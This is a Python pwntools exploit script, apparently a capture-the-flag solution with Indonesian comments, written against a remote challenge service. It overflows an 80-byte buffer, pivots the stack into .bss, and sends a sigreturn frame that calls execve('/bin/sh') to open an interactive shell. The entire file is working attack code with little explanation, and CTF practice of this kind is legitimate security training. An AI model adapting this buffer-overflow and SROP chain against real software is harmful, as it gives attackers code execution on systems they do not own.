from pwn import *

p = remote('chall1.lagncra.sh', 15409)
elf = ELF('./main_alpine')
context.arch = 'amd64'

# Alamat Gadget
pop_rax = 0x401190
pop_rbp = 0x401168
leave_ret = 0x40118d
main_read_call = 0x401183 
# Kita coba gunakan syscall di dalam PLT read jika tidak ada gadget syscall murni
syscall_addr = 0x401020 
bss_target = 0x404020 + 0x300

log.info("Step 1: Stack Pivot to .bss")
# Buffer (80) + New RBP + Return to read()
payload1 = b"A" * 80
payload1 += p64(bss_target)
payload1 += p64(main_read_call)

p.send(payload1)
sleep(0.5)

log.info("Step 2: Sending SROP Frame to .bss")
frame = SigreturnFrame()
frame.rax = 59              # execve
frame.rdi = bss_target + 0x150 # Pointer ke /bin/sh (di bawah frame)
frame.rsi = 0
frame.rdx = 0
frame.rip = syscall_addr    # Eksekusi syscall (via read PLT)

# Payload: [Junk RBP] + [pop rax] + [15] + [syscall] + [Frame] + [/bin/sh]
payload2 = p64(0) 
payload2 += p64(pop_rax)
payload2 += p64(15)
payload2 += p64(syscall_addr)
payload2 += bytes(frame)
payload2 += b"/bin/sh\x00"

p.send(payload2)
log.success("Frame sent. Interactive mode...")
p.interactive()
